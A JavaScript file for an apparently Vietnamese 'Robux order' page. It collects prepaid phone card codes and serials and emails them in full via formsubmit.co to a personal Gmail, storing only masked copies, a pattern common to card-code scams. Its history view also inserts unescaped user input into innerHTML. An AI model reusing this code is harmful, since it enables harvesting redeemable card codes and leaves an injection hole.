// ==== FIREBASE CONFIG (DÁN CỦA BẠN) ====
firebase.initializeApp({
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_DOMAIN",
  projectId: "YOUR_PROJECT_ID"
});

const auth = firebase.auth();
const db = firebase.firestore();

const home = document.getElementById("home");
const historyBox = document.getElementById("history");

homeBtn.onclick = () => {
  home.classList.remove("hidden");
  historyBox.classList.add("hidden");
};

historyBtn.onclick = () => {
  home.classList.add("hidden");
  historyBox.classList.remove("hidden");
  loadHistory();
};

loginBtn.onclick = () => {
  const provider = new firebase.auth.GoogleAuthProvider();
  auth.signInWithPopup(provider);
};

let lastSubmit = 0;

submit.onclick = async () => {
  if(Date.now() - lastSubmit < 10000){
    alert("Vui lòng chờ 10 giây");
    return;
  }
  lastSubmit = Date.now();

  const data = {
    roblox: roblox.value,
    package: package.value,
    cardType: cardType.value,
    cardValue: cardValue.value,
    code: cardCode.value,
    serial: cardSerial.value,
    time: Date.now()
  };

  if(Object.values(data).some(v => !v)){
    alert("Vui lòng nhập đầy đủ");
    return;
  }

  // gửi email
  fetch("https://formsubmit.co/ajax/minhtrankhai131110@gmail.com",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({
      subject: "Đơn Robux",
      message:
        "Roblox: "+data.roblox+"\n"+
        "Gói: "+data.package+"\n"+
        "Nhà mạng: "+data.cardType+"\n"+
        "Mệnh giá: "+data.cardValue+"\n"+
        "Mã: "+data.code+"\n"+
        "Serial: "+data.serial
    })
  });

  const u = auth.currentUser;
  if(u){
    await db.collection("orders").add({
      uid: u.uid,
      roblox: data.roblox,
      package: data.package,
      cardType: data.cardType,
      cardValue: data.cardValue,
      code: "***"+data.code.slice(-3),
      serial: "***"+data.serial.slice(-3),
      time: data.time
    });
  }

  alert("Đã gửi đơn!");
};

async function loadHistory(){
  historyList.innerHTML="";
  const u = auth.currentUser;
  if(!u) return;
  const q = await db.collection("orders")
    .where("uid","==",u.uid)
    .orderBy("time","desc")
    .get();

  q.forEach(d=>{
    const o = d.data();
    historyList.innerHTML += `<div class="item">
      ${o.roblox} - ${o.package} - ${o.cardValue}
    </div>`;
  });
}
